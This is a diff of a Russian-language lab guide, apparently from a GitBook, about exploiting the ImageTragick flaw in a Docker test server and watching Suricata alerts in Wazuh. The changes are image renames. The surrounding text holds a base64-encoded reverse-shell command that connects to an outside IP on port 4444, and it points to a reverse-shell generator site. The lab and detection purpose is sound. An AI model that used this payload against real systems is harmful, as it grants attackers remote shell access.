@@ -19,7 +19,7 @@ docker compose up -d
 
 После запуска сервера по адресу `http://ваш-ip:8080/` будет доступна страница с возможностью загрузки файлов
 
-<figure><img src="../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagetragick(1).png" alt=""><figcaption></figcaption></figure>
 
 Для реализации данной уязвимости нужно отправить POST-запрос с полезной нагрузкой:
 
@@ -49,7 +49,7 @@ pop graphic-context
 
 Видно, что после его отправки мы получили http-запрос
 
-<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagetragick(2).png" alt=""><figcaption></figcaption></figure>
 
 С помощью данной уязвимости мы можем получить обратную оболочку, отправив следующий запрос:
 
@@ -81,18 +81,18 @@ pop graphic-context
 
 Здесь c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTEuMTQ1LzQ0NDQgMD4mMQo= - это закодированная в base64 полезная нагрузка для получения обратной оболочки
 
-<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagetragick(3).png" alt=""><figcaption></figcaption></figure>
 
 Сгенерировать свою собственную нагрузку можно на [https://www.revshells.com/](https://www.revshells.com/)
 
-<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagetragick(4).png" alt=""><figcaption></figcaption></figure>
 
 \*\*\*
 
 После отправки запроса с созданным пэйлоадом мы можем получить обратную оболочку поднятого контейнера
 
-<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagetragick(5).png" alt=""><figcaption></figcaption></figure>
 
 В Wazuh (https://ваш-ip/app/wazuh) мы можем увидеть соответствующие алерты от IDS Suricata об эксплуатации данной уязвимости.
 
-<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagetragick(6).png" alt=""><figcaption></figcaption></figure>
